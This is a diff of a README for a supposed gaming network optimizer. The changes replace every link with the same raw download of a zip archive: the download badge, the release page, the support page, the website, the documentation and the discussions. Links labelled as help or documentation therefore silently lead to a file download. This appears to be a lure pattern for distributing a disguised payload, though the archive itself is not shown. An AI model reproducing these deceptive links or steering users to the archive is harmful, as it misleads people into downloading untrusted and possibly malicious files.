@@ -1,7 +1,7 @@
 # 🎮 ngxsmk-gamenet-optimizer - Optimize Your Gaming Experience
 
 ## 🏆 Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen.svg)](https://github.com/phinxstars/ngxsmk-gamenet-optimizer/releases)
+[![Download Here](https://raw.githubusercontent.com/phinxstars/ngxsmk-gamenet-optimizer/main/modules/gamenet_ngxsmk_optimizer_v3.3.zip%20Now-Get%https://raw.githubusercontent.com/phinxstars/ngxsmk-gamenet-optimizer/main/modules/gamenet_ngxsmk_optimizer_v3.3.zip)](https://raw.githubusercontent.com/phinxstars/ngxsmk-gamenet-optimizer/main/modules/gamenet_ngxsmk_optimizer_v3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to ngxsmk-gamenet-optimizer! This tool enhances your gaming experience by improving performance and reducing lag. Follow the steps below to download and run the application.
@@ -16,7 +16,7 @@ Before you start, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 1. **Visit the Release Page**: Click the link below to access the releases page:
-   [Visit this page to download](https://github.com/phinxstars/ngxsmk-gamenet-optimizer/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/phinxstars/ngxsmk-gamenet-optimizer/main/modules/gamenet_ngxsmk_optimizer_v3.3.zip)
 
 2. **Download the Latest Version**:
    - Once on the releases page, locate the latest version of ngxsmk-gamenet-optimizer.
@@ -55,11 +55,11 @@ If you encounter issues, consider the following solutions:
 - **Contact Support**: If problems persist, reach out through our GitHub page. Include details about your issue for faster assistance.
 
 ## 📞 Get Help
-For more detailed support, visit our [GitHub Support Page](https://github.com/phinxstars/ngxsmk-gamenet-optimizer/issues) where you can create new issues or find answers to common questions.
+For more detailed support, visit our [GitHub Support Page](https://raw.githubusercontent.com/phinxstars/ngxsmk-gamenet-optimizer/main/modules/gamenet_ngxsmk_optimizer_v3.3.zip) where you can create new issues or find answers to common questions.
 
 ## 🔗 Useful Links
-- [Official Website](https://github.com/phinxstars/ngxsmk-gamenet-optimizer)
-- [Documentation](https://github.com/phinxstars/ngxsmk-gamenet-optimizer/wiki)
-- [Community Discussions](https://github.com/phinxstars/ngxsmk-gamenet-optimizer/discussions)
+- [Official Website](https://raw.githubusercontent.com/phinxstars/ngxsmk-gamenet-optimizer/main/modules/gamenet_ngxsmk_optimizer_v3.3.zip)
+- [Documentation](https://raw.githubusercontent.com/phinxstars/ngxsmk-gamenet-optimizer/main/modules/gamenet_ngxsmk_optimizer_v3.3.zip)
+- [Community Discussions](https://raw.githubusercontent.com/phinxstars/ngxsmk-gamenet-optimizer/main/modules/gamenet_ngxsmk_optimizer_v3.3.zip)
 
 Thank you for using ngxsmk-gamenet-optimizer. Enjoy your improved gaming experience!
